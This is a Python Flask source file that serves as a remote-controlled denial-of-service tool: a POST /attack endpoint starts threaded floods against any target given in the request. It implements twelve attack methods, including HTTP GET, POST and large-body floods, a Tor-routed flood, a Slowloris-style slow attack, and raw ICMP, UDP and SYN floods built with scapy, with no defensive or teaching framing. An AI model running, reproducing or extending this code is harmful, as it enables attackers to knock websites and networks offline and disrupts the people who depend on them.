from flask import Flask, request, jsonify
import threading
import socket
import time
import random
import string
import os
import requests
import socks
import http.client
import ssl
from scapy.all import *

app = Flask(__name__)

def random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, port))
            s.close()
        except:
            pass

def post_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nContent-Length: 5235\r\n\r\n" + os.urandom(5235), (target, port))
            s.close()
        except:
            pass

def http_flood_all(target, port, duration):
    timeout = time.time() + duration
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            method = random.choice(methods)
            s.sendto(f"{method} / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode(), (target, port))
            s.close()
        except:
            pass

def big_req(target, port, duration):
    timeout = time.time() + duration
    payload = os.urandom(65535)
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nContent-Length: 65535\r\n\r\n" + payload, (target, port))
            s.close()
        except:
            pass

def rhex(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            data = os.urandom(1024).hex().encode()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(data)
            s.close()
        except:
            pass

def tor_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            s = socket.socket()
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

def pps(target, port, duration):
    timeout = time.time() + duration
    payload = b"GET / HTTP/1.1\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(payload)
            s.close()
        except:
            pass

def head(target, port, duration):
    timeout = time.time() + duration
    payload = b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(payload)
            s.close()
        except:
            pass

def slow(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            time.sleep(1)
        except:
            pass

def icmp_flood(target, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        send(IP(dst=target)/ICMP(), verbose=0)

def udp_flood(target, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        sock.sendto(os.urandom(1024), (target, port))

def syn_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        send(ip/tcp, verbose=0)

methods = {
    "GET": get_flood,
    "POST": post_flood,
    "HTTP": http_flood_all,
    "BIGREQ": big_req,
    "RHEX": rhex,
    "TOR": tor_flood,
    "PPS": pps,
    "HEAD": head,
    "SLOW": slow,
    "ICMP": icmp_flood,
    "UDP": udp_flood,
    "SYN": syn_flood
}

@app.route("/attack", methods=["POST"])
def attack():
    data = request.json
    method = data.get("method")
    target = data.get("target")
    port = int(data.get("port", 80))
    duration = int(data.get("time", 60))
    threads = int(data.get("threads", 10))

    if method not in methods:
        return jsonify({"error": "Método inválido.", "Avaliable Methods": methods}), 400

    for _ in range(threads):
        t = threading.Thread(target=methods[method], args=(target, port, duration))
        t.start()

    return jsonify({"status": "Ataque iniciado."})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
